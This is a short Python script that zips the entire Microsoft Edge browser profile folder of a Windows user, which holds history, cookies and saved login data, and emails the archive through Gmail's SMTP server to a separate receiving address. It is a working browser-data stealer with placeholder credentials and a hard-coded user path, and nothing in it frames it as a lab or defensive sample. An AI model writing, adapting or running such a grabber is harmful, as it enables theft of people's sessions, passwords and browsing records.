import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import zipfile
import glob


def grab():
    email_user = "sending email"
    email_password = "sending email password"
    email_rcver = "recieving email"

    subject = "[ TEST ]"

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_rcver
    msg['Subject'] = subject

    body = "[ TEST ]"
    msg.attach(MIMEText(body, 'plain'))

    with zipfile.ZipFile('default.zip', 'w') as f:
        for file in glob.glob(r'C:\Users\domin\AppData\Local\Microsoft\Edge\User Data\Default\*'):
            f.write(file)
    print("compressed")
    history = "default.zip"
    attachment = open(history, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('content-disposition', "attachment; filename= "+history)

    msg.attach(part)
    text = msg.as_string()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, email_password)

    server.sendmail(email_user, email_rcver, text)
    server.quit()

    print("Sent!")